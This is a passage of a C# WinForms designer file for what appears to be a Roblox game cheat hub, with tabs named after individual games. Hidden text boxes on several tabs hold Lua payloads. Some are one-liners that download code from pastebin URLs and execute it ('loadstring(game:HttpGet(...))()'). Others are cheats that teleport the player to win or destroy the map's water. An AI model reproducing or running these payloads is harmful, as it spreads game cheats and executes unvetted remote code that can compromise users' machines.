            this.flatButton431.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton431.UseCustomColor = false;
            this.flatButton431.Click += new System.EventHandler(this.flatButton431_Click);
            // 
            // tabPage152
            // 
            this.tabPage152.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(70)))), ((int)(((byte)(73)))));
            this.tabPage152.Controls.Add(this.flatButton432);
            this.tabPage152.Controls.Add(this.pictureBox273);
            this.tabPage152.Controls.Add(this.flatButton433);
            this.tabPage152.Location = new System.Drawing.Point(4, 44);
            this.tabPage152.Name = "tabPage152";
            this.tabPage152.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage152.Size = new System.Drawing.Size(514, 249);
            this.tabPage152.TabIndex = 147;
            this.tabPage152.Text = "Flicker";
            // 
            // flatButton432
            // 
            this.flatButton432.BackColor = System.Drawing.Color.Transparent;
            this.flatButton432.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton432.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton432.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton432.ForeColor = System.Drawing.Color.CornflowerBlue;
            this.flatButton432.Location = new System.Drawing.Point(557, 369);
            this.flatButton432.Name = "flatButton432";
            this.flatButton432.Rounded = false;
            this.flatButton432.Size = new System.Drawing.Size(106, 35);
            this.flatButton432.TabIndex = 33;
            this.flatButton432.Text = "Home";
            this.flatButton432.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton432.UseCustomColor = false;
            this.flatButton432.Click += new System.EventHandler(this.flatButton432_Click);
            // 
            // pictureBox273
            // 
            this.pictureBox273.Location = new System.Drawing.Point(514, 6);
            this.pictureBox273.Name = "pictureBox273";
            this.pictureBox273.Size = new System.Drawing.Size(149, 149);
            this.pictureBox273.TabIndex = 32;
            this.pictureBox273.TabStop = false;
            // 
            // flatButton433
            // 
            this.flatButton433.BackColor = System.Drawing.Color.Transparent;
            this.flatButton433.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton433.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton433.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton433.Location = new System.Drawing.Point(6, 6);
            this.flatButton433.Name = "flatButton433";
            this.flatButton433.Rounded = false;
            this.flatButton433.Size = new System.Drawing.Size(106, 35);
            this.flatButton433.TabIndex = 30;
            this.flatButton433.Text = "Gui";
            this.flatButton433.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton433.UseCustomColor = false;
            this.flatButton433.Click += new System.EventHandler(this.flatButton433_Click);
            // 
            // tabPage153
            // 
            this.tabPage153.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(70)))), ((int)(((byte)(73)))));
            this.tabPage153.Controls.Add(this.flatButton434);
            this.tabPage153.Controls.Add(this.pictureBox274);
            this.tabPage153.Controls.Add(this.richTextBox98);
            this.tabPage153.Controls.Add(this.flatButton435);
            this.tabPage153.Location = new System.Drawing.Point(4, 44);
            this.tabPage153.Name = "tabPage153";
            this.tabPage153.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage153.Size = new System.Drawing.Size(514, 249);
            this.tabPage153.TabIndex = 148;
            this.tabPage153.Text = "Word Bomb";
            // 
            // flatButton434
            // 
            this.flatButton434.BackColor = System.Drawing.Color.Transparent;
            this.flatButton434.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton434.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton434.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton434.ForeColor = System.Drawing.Color.CornflowerBlue;
            this.flatButton434.Location = new System.Drawing.Point(557, 369);
            this.flatButton434.Name = "flatButton434";
            this.flatButton434.Rounded = false;
            this.flatButton434.Size = new System.Drawing.Size(106, 35);
            this.flatButton434.TabIndex = 33;
            this.flatButton434.Text = "Home";
            this.flatButton434.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton434.UseCustomColor = false;
            this.flatButton434.Click += new System.EventHandler(this.flatButton434_Click);
            // 
            // pictureBox274
            // 
            this.pictureBox274.Location = new System.Drawing.Point(514, 6);
            this.pictureBox274.Name = "pictureBox274";
            this.pictureBox274.Size = new System.Drawing.Size(149, 149);
            this.pictureBox274.TabIndex = 32;
            this.pictureBox274.TabStop = false;
            // 
            // richTextBox98
            // 
            this.richTextBox98.Location = new System.Drawing.Point(6, 47);
            this.richTextBox98.Name = "richTextBox98";
            this.richTextBox98.Size = new System.Drawing.Size(106, 178);
            this.richTextBox98.TabIndex = 31;
            this.richTextBox98.Text = "loadstring(game:HttpGet(\"https://pastebin.com/raw/wwY71M4N\"))()\n";
            this.richTextBox98.Visible = false;
            // 
            // flatButton435
            // 
            this.flatButton435.BackColor = System.Drawing.Color.Transparent;
            this.flatButton435.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton435.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton435.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton435.Location = new System.Drawing.Point(6, 6);
            this.flatButton435.Name = "flatButton435";
            this.flatButton435.Rounded = false;
            this.flatButton435.Size = new System.Drawing.Size(106, 35);
            this.flatButton435.TabIndex = 30;
            this.flatButton435.Text = "Gui";
            this.flatButton435.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton435.UseCustomColor = false;
            this.flatButton435.Click += new System.EventHandler(this.flatButton435_Click);
            // 
            // tabPage154
            // 
            this.tabPage154.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(70)))), ((int)(((byte)(73)))));
            this.tabPage154.Controls.Add(this.flatButton436);
            this.tabPage154.Controls.Add(this.pictureBox275);
            this.tabPage154.Controls.Add(this.richTextBox99);
            this.tabPage154.Controls.Add(this.flatButton437);
            this.tabPage154.Location = new System.Drawing.Point(4, 44);
            this.tabPage154.Name = "tabPage154";
            this.tabPage154.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage154.Size = new System.Drawing.Size(514, 249);
            this.tabPage154.TabIndex = 149;
            this.tabPage154.Text = "Plus Ultra II";
            // 
            // flatButton436
            // 
            this.flatButton436.BackColor = System.Drawing.Color.Transparent;
            this.flatButton436.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton436.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton436.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton436.ForeColor = System.Drawing.Color.CornflowerBlue;
            this.flatButton436.Location = new System.Drawing.Point(557, 369);
            this.flatButton436.Name = "flatButton436";
            this.flatButton436.Rounded = false;
            this.flatButton436.Size = new System.Drawing.Size(106, 35);
            this.flatButton436.TabIndex = 37;
            this.flatButton436.Text = "Home";
            this.flatButton436.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton436.UseCustomColor = false;
            this.flatButton436.Click += new System.EventHandler(this.flatButton436_Click);
            // 
            // pictureBox275
            // 
            this.pictureBox275.Location = new System.Drawing.Point(514, 6);
            this.pictureBox275.Name = "pictureBox275";
            this.pictureBox275.Size = new System.Drawing.Size(149, 149);
            this.pictureBox275.TabIndex = 36;
            this.pictureBox275.TabStop = false;
            // 
            // richTextBox99
            // 
            this.richTextBox99.Location = new System.Drawing.Point(6, 47);
            this.richTextBox99.Name = "richTextBox99";
            this.richTextBox99.Size = new System.Drawing.Size(106, 178);
            this.richTextBox99.TabIndex = 35;
            this.richTextBox99.Text = "_G.togglekey = \"G\"\nloadstring(game:HttpGet(\"https://pastebin.com/raw/K9xENQmX\", t" +
    "rue))()\n";
            this.richTextBox99.Visible = false;
            // 
            // flatButton437
            // 
            this.flatButton437.BackColor = System.Drawing.Color.Transparent;
            this.flatButton437.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton437.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton437.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton437.Location = new System.Drawing.Point(6, 6);
            this.flatButton437.Name = "flatButton437";
            this.flatButton437.Rounded = false;
            this.flatButton437.Size = new System.Drawing.Size(106, 35);
            this.flatButton437.TabIndex = 34;
            this.flatButton437.Text = "Gui";
            this.flatButton437.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton437.UseCustomColor = false;
            this.flatButton437.Click += new System.EventHandler(this.flatButton437_Click);
            // 
            // tabPage155
            // 
            this.tabPage155.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(70)))), ((int)(((byte)(73)))));
            this.tabPage155.Controls.Add(this.flatButton438);
            this.tabPage155.Controls.Add(this.pictureBox276);
            this.tabPage155.Controls.Add(this.richTextBox100);
            this.tabPage155.Controls.Add(this.flatButton439);
            this.tabPage155.Location = new System.Drawing.Point(4, 44);
            this.tabPage155.Name = "tabPage155";
            this.tabPage155.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage155.Size = new System.Drawing.Size(514, 249);
            this.tabPage155.TabIndex = 150;
            this.tabPage155.Text = "Fantastic Frontier";
            // 
            // flatButton438
            // 
            this.flatButton438.BackColor = System.Drawing.Color.Transparent;
            this.flatButton438.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton438.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton438.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton438.ForeColor = System.Drawing.Color.CornflowerBlue;
            this.flatButton438.Location = new System.Drawing.Point(557, 369);
            this.flatButton438.Name = "flatButton438";
            this.flatButton438.Rounded = false;
            this.flatButton438.Size = new System.Drawing.Size(106, 35);
            this.flatButton438.TabIndex = 41;
            this.flatButton438.Text = "Home";
            this.flatButton438.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton438.UseCustomColor = false;
            this.flatButton438.Click += new System.EventHandler(this.flatButton438_Click);
            // 
            // pictureBox276
            // 
            this.pictureBox276.Location = new System.Drawing.Point(514, 6);
            this.pictureBox276.Name = "pictureBox276";
            this.pictureBox276.Size = new System.Drawing.Size(149, 149);
            this.pictureBox276.TabIndex = 40;
            this.pictureBox276.TabStop = false;
            // 
            // richTextBox100
            // 
            this.richTextBox100.Location = new System.Drawing.Point(6, 47);
            this.richTextBox100.Name = "richTextBox100";
            this.richTextBox100.Size = new System.Drawing.Size(106, 178);
            this.richTextBox100.TabIndex = 39;
            this.richTextBox100.Text = "loadstring(game:HttpGet(\"https://pastebin.com/raw/MQS6bNeN\", true))()";
            this.richTextBox100.Visible = false;
            // 
            // flatButton439
            // 
            this.flatButton439.BackColor = System.Drawing.Color.Transparent;
            this.flatButton439.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton439.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton439.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton439.Location = new System.Drawing.Point(6, 6);
            this.flatButton439.Name = "flatButton439";
            this.flatButton439.Rounded = false;
            this.flatButton439.Size = new System.Drawing.Size(106, 35);
            this.flatButton439.TabIndex = 38;
            this.flatButton439.Text = "Gui";
            this.flatButton439.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton439.UseCustomColor = false;
            this.flatButton439.Click += new System.EventHandler(this.flatButton439_Click);
            // 
            // tabPage156
            // 
            this.tabPage156.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(70)))), ((int)(((byte)(73)))));
            this.tabPage156.Controls.Add(this.richTextBox103);
            this.tabPage156.Controls.Add(this.flatButton442);
            this.tabPage156.Controls.Add(this.flatButton440);
            this.tabPage156.Controls.Add(this.pictureBox277);
            this.tabPage156.Controls.Add(this.richTextBox102);
            this.tabPage156.Controls.Add(this.flatButton441);
            this.tabPage156.Location = new System.Drawing.Point(4, 44);
            this.tabPage156.Name = "tabPage156";
            this.tabPage156.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage156.Size = new System.Drawing.Size(514, 249);
            this.tabPage156.TabIndex = 151;
            this.tabPage156.Text = "Cursed Island";
            // 
            // richTextBox103
            // 
            this.richTextBox103.Location = new System.Drawing.Point(134, 47);
            this.richTextBox103.Name = "richTextBox103";
            this.richTextBox103.Size = new System.Drawing.Size(106, 178);
            this.richTextBox103.TabIndex = 47;
            this.richTextBox103.Text = "while true do\nwait(.1)\ngame.Workspace.Map.Classic.Water:Destroy()\ngame.Workspace." +
    "Map.Classic.Water.TouchInterest:Destroy()\nend";
            this.richTextBox103.Visible = false;
            // 
            // flatButton442
            // 
            this.flatButton442.BackColor = System.Drawing.Color.Transparent;
            this.flatButton442.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton442.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton442.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton442.Location = new System.Drawing.Point(134, 6);
            this.flatButton442.Name = "flatButton442";
            this.flatButton442.Rounded = false;
            this.flatButton442.Size = new System.Drawing.Size(129, 35);
            this.flatButton442.TabIndex = 46;
            this.flatButton442.Text = "Remove Water";
            this.flatButton442.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton442.UseCustomColor = false;
            this.flatButton442.Click += new System.EventHandler(this.flatButton442_Click);
            // 
            // flatButton440
            // 
            this.flatButton440.BackColor = System.Drawing.Color.Transparent;
            this.flatButton440.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton440.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton440.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton440.ForeColor = System.Drawing.Color.CornflowerBlue;
            this.flatButton440.Location = new System.Drawing.Point(557, 369);
            this.flatButton440.Name = "flatButton440";
            this.flatButton440.Rounded = false;
            this.flatButton440.Size = new System.Drawing.Size(106, 35);
            this.flatButton440.TabIndex = 45;
            this.flatButton440.Text = "Home";
            this.flatButton440.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton440.UseCustomColor = false;
            this.flatButton440.Click += new System.EventHandler(this.flatButton440_Click);
            // 
            // pictureBox277
            // 
            this.pictureBox277.Location = new System.Drawing.Point(514, 6);
            this.pictureBox277.Name = "pictureBox277";
            this.pictureBox277.Size = new System.Drawing.Size(149, 149);
            this.pictureBox277.TabIndex = 44;
            this.pictureBox277.TabStop = false;
            // 
            // richTextBox102
            // 
            this.richTextBox102.Location = new System.Drawing.Point(6, 47);
            this.richTextBox102.Name = "richTextBox102";
            this.richTextBox102.Size = new System.Drawing.Size(106, 178);
            this.richTextBox102.TabIndex = 43;
            this.richTextBox102.Text = "for i=1,5 do\ngame.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame." +
    "new(235,56,17)\nend";
            this.richTextBox102.Visible = false;
            // 
            // flatButton441
            // 
            this.flatButton441.BackColor = System.Drawing.Color.Transparent;
            this.flatButton441.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton441.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton441.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton441.Location = new System.Drawing.Point(6, 6);
            this.flatButton441.Name = "flatButton441";
            this.flatButton441.Rounded = false;
            this.flatButton441.Size = new System.Drawing.Size(106, 35);
            this.flatButton441.TabIndex = 42;
            this.flatButton441.Text = "Always Win";
            this.flatButton441.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton441.UseCustomColor = false;
            this.flatButton441.Click += new System.EventHandler(this.flatButton441_Click);
            // 
            // tabPage158
            // 
            this.tabPage158.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(70)))), ((int)(((byte)(73)))));
            this.tabPage158.Controls.Add(this.flatButton56);
            this.tabPage158.Controls.Add(this.pictureBox33);
            this.tabPage158.Controls.Add(this.flatButton76);
            this.tabPage158.Location = new System.Drawing.Point(4, 44);
            this.tabPage158.Name = "tabPage158";
            this.tabPage158.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage158.Size = new System.Drawing.Size(514, 249);
            this.tabPage158.TabIndex = 153;
            this.tabPage158.Text = "Batting Champions";
            // 
            // flatButton56
            // 
            this.flatButton56.BackColor = System.Drawing.Color.Transparent;
            this.flatButton56.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton56.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton56.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton56.ForeColor = System.Drawing.Color.CornflowerBlue;
            this.flatButton56.Location = new System.Drawing.Point(557, 369);
            this.flatButton56.Name = "flatButton56";
            this.flatButton56.Rounded = false;
            this.flatButton56.Size = new System.Drawing.Size(106, 35);
            this.flatButton56.TabIndex = 24;
            this.flatButton56.Text = "Home";
            this.flatButton56.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton56.UseCustomColor = false;
            this.flatButton56.Click += new System.EventHandler(this.flatButton56_Click);
            // 
            // pictureBox33
            // 
            this.pictureBox33.Location = new System.Drawing.Point(514, 6);
            this.pictureBox33.Name = "pictureBox33";
            this.pictureBox33.Size = new System.Drawing.Size(149, 149);
            this.pictureBox33.TabIndex = 23;
            this.pictureBox33.TabStop = false;
            // 
            // flatButton76
            // 
            this.flatButton76.BackColor = System.Drawing.Color.Transparent;
            this.flatButton76.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton76.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton76.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton76.Location = new System.Drawing.Point(6, 6);
            this.flatButton76.Name = "flatButton76";
            this.flatButton76.Rounded = false;
            this.flatButton76.Size = new System.Drawing.Size(106, 35);
            this.flatButton76.TabIndex = 22;
            this.flatButton76.Text = "Gui";
            this.flatButton76.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton76.UseCustomColor = false;
            this.flatButton76.Click += new System.EventHandler(this.flatButton76_Click);
            // 
            // tabPage159
            // 
            this.tabPage159.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(70)))), ((int)(((byte)(73)))));
            this.tabPage159.Controls.Add(this.flatButton455);
            this.tabPage159.Controls.Add(this.pictureBox287);
            this.tabPage159.Controls.Add(this.flatButton456);
            this.tabPage159.Location = new System.Drawing.Point(4, 44);
            this.tabPage159.Name = "tabPage159";
            this.tabPage159.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage159.Size = new System.Drawing.Size(514, 249);
            this.tabPage159.TabIndex = 154;
            this.tabPage159.Text = "NeoKnives";
            // 
            // flatButton455
            // 
            this.flatButton455.BackColor = System.Drawing.Color.Transparent;
            this.flatButton455.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton455.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton455.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton455.ForeColor = System.Drawing.Color.CornflowerBlue;
            this.flatButton455.Location = new System.Drawing.Point(557, 369);
            this.flatButton455.Name = "flatButton455";
            this.flatButton455.Rounded = false;
            this.flatButton455.Size = new System.Drawing.Size(106, 35);
            this.flatButton455.TabIndex = 24;
            this.flatButton455.Text = "Home";
            this.flatButton455.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton455.UseCustomColor = false;
            this.flatButton455.Click += new System.EventHandler(this.flatButton455_Click);
            // 
            // pictureBox287
            // 
            this.pictureBox287.Location = new System.Drawing.Point(514, 6);
            this.pictureBox287.Name = "pictureBox287";
            this.pictureBox287.Size = new System.Drawing.Size(149, 149);
            this.pictureBox287.TabIndex = 23;
            this.pictureBox287.TabStop = false;
            // 
            // flatButton456
            // 
            this.flatButton456.BackColor = System.Drawing.Color.Transparent;
            this.flatButton456.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton456.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton456.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton456.Location = new System.Drawing.Point(6, 6);
            this.flatButton456.Name = "flatButton456";
            this.flatButton456.Rounded = false;
            this.flatButton456.Size = new System.Drawing.Size(106, 35);
            this.flatButton456.TabIndex = 22;
            this.flatButton456.Text = "Gui";
            this.flatButton456.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton456.UseCustomColor = false;
            this.flatButton456.Click += new System.EventHandler(this.flatButton456_Click);
            // 
            // tabPage160
            // 
            this.tabPage160.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(70)))), ((int)(((byte)(73)))));
            this.tabPage160.Controls.Add(this.flatButton457);
            this.tabPage160.Controls.Add(this.pictureBox288);
            this.tabPage160.Controls.Add(this.flatButton458);
            this.tabPage160.Location = new System.Drawing.Point(4, 44);
            this.tabPage160.Name = "tabPage160";
            this.tabPage160.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage160.Size = new System.Drawing.Size(514, 249);
            this.tabPage160.TabIndex = 155;
            this.tabPage160.Text = "Blox Fruits";
            // 
            // flatButton457
            // 
            this.flatButton457.BackColor = System.Drawing.Color.Transparent;
            this.flatButton457.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton457.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton457.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton457.ForeColor = System.Drawing.Color.CornflowerBlue;
            this.flatButton457.Location = new System.Drawing.Point(557, 369);
            this.flatButton457.Name = "flatButton457";
            this.flatButton457.Rounded = false;
            this.flatButton457.Size = new System.Drawing.Size(106, 35);
            this.flatButton457.TabIndex = 27;
            this.flatButton457.Text = "Home";
            this.flatButton457.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton457.UseCustomColor = false;
            this.flatButton457.Click += new System.EventHandler(this.flatButton457_Click);
            // 
            // pictureBox288
            // 
            this.pictureBox288.Location = new System.Drawing.Point(514, 6);
            this.pictureBox288.Name = "pictureBox288";
            this.pictureBox288.Size = new System.Drawing.Size(149, 149);
            this.pictureBox288.TabIndex = 26;
            this.pictureBox288.TabStop = false;
            // 
            // flatButton458
            // 
            this.flatButton458.BackColor = System.Drawing.Color.Transparent;
            this.flatButton458.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton458.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton458.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton458.Location = new System.Drawing.Point(6, 6);
            this.flatButton458.Name = "flatButton458";
            this.flatButton458.Rounded = false;
            this.flatButton458.Size = new System.Drawing.Size(106, 35);
            this.flatButton458.TabIndex = 25;
            this.flatButton458.Text = "Gui";
            this.flatButton458.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton458.UseCustomColor = false;
            this.flatButton458.Click += new System.EventHandler(this.flatButton458_Click);
            // 
            // tabPage161
            // 
            this.tabPage161.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(70)))), ((int)(((byte)(73)))));
            this.tabPage161.Controls.Add(this.flatButton459);
            this.tabPage161.Controls.Add(this.pictureBox289);
            this.tabPage161.Controls.Add(this.flatButton460);
            this.tabPage161.Location = new System.Drawing.Point(4, 44);
            this.tabPage161.Name = "tabPage161";
            this.tabPage161.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage161.Size = new System.Drawing.Size(514, 249);
            this.tabPage161.TabIndex = 156;
            this.tabPage161.Text = "Building Simulator 2";
            // 
            // flatButton459
            // 
            this.flatButton459.BackColor = System.Drawing.Color.Transparent;
            this.flatButton459.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton459.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton459.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton459.ForeColor = System.Drawing.Color.CornflowerBlue;
            this.flatButton459.Location = new System.Drawing.Point(557, 369);
            this.flatButton459.Name = "flatButton459";
            this.flatButton459.Rounded = false;
            this.flatButton459.Size = new System.Drawing.Size(106, 35);
            this.flatButton459.TabIndex = 30;
            this.flatButton459.Text = "Home";
            this.flatButton459.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton459.UseCustomColor = false;
            this.flatButton459.Click += new System.EventHandler(this.flatButton459_Click);
            // 
            // pictureBox289
            // 
            this.pictureBox289.Location = new System.Drawing.Point(514, 6);
            this.pictureBox289.Name = "pictureBox289";
            this.pictureBox289.Size = new System.Drawing.Size(149, 149);
            this.pictureBox289.TabIndex = 29;
            this.pictureBox289.TabStop = false;
            // 
            // flatButton460
            // 
            this.flatButton460.BackColor = System.Drawing.Color.Transparent;
            this.flatButton460.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton460.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton460.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton460.Location = new System.Drawing.Point(6, 6);
            this.flatButton460.Name = "flatButton460";
            this.flatButton460.Rounded = false;
            this.flatButton460.Size = new System.Drawing.Size(106, 35);
            this.flatButton460.TabIndex = 28;
            this.flatButton460.Text = "Gui";
            this.flatButton460.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton460.UseCustomColor = false;
            this.flatButton460.Click += new System.EventHandler(this.flatButton460_Click);
            // 
            // tabPage162
            // 
            this.tabPage162.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(70)))), ((int)(((byte)(73)))));
            this.tabPage162.Controls.Add(this.flatButton461);
            this.tabPage162.Controls.Add(this.pictureBox290);
            this.tabPage162.Controls.Add(this.flatButton462);
            this.tabPage162.Location = new System.Drawing.Point(4, 44);
            this.tabPage162.Name = "tabPage162";
            this.tabPage162.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage162.Size = new System.Drawing.Size(514, 249);
            this.tabPage162.TabIndex = 157;
            this.tabPage162.Text = "Laser Legends";
            // 
            // flatButton461
            // 
            this.flatButton461.BackColor = System.Drawing.Color.Transparent;
            this.flatButton461.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton461.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton461.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton461.ForeColor = System.Drawing.Color.CornflowerBlue;
            this.flatButton461.Location = new System.Drawing.Point(557, 369);
            this.flatButton461.Name = "flatButton461";
            this.flatButton461.Rounded = false;
            this.flatButton461.Size = new System.Drawing.Size(106, 35);
            this.flatButton461.TabIndex = 33;
            this.flatButton461.Text = "Home";
            this.flatButton461.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton461.UseCustomColor = false;
            this.flatButton461.Click += new System.EventHandler(this.flatButton461_Click);
            // 
            // pictureBox290
            // 
            this.pictureBox290.Location = new System.Drawing.Point(514, 6);
            this.pictureBox290.Name = "pictureBox290";
            this.pictureBox290.Size = new System.Drawing.Size(149, 149);
            this.pictureBox290.TabIndex = 32;
            this.pictureBox290.TabStop = false;
            // 
            // flatButton462
            // 
            this.flatButton462.BackColor = System.Drawing.Color.Transparent;
            this.flatButton462.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton462.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton462.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton462.Location = new System.Drawing.Point(6, 6);
            this.flatButton462.Name = "flatButton462";
            this.flatButton462.Rounded = false;
            this.flatButton462.Size = new System.Drawing.Size(106, 35);
            this.flatButton462.TabIndex = 31;
            this.flatButton462.Text = "Gui";
            this.flatButton462.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton462.UseCustomColor = false;
            this.flatButton462.Click += new System.EventHandler(this.flatButton462_Click);
            // 
            // tabPage163
            // 
            this.tabPage163.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(70)))), ((int)(((byte)(73)))));
            this.tabPage163.Controls.Add(this.flatButton463);
            this.tabPage163.Controls.Add(this.pictureBox291);
            this.tabPage163.Controls.Add(this.richTextBox106);
            this.tabPage163.Controls.Add(this.flatButton464);
            this.tabPage163.Location = new System.Drawing.Point(4, 44);
            this.tabPage163.Name = "tabPage163";
            this.tabPage163.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage163.Size = new System.Drawing.Size(514, 249);
            this.tabPage163.TabIndex = 158;
            this.tabPage163.Text = "Flee The Facility";
            // 
            // flatButton463
            // 
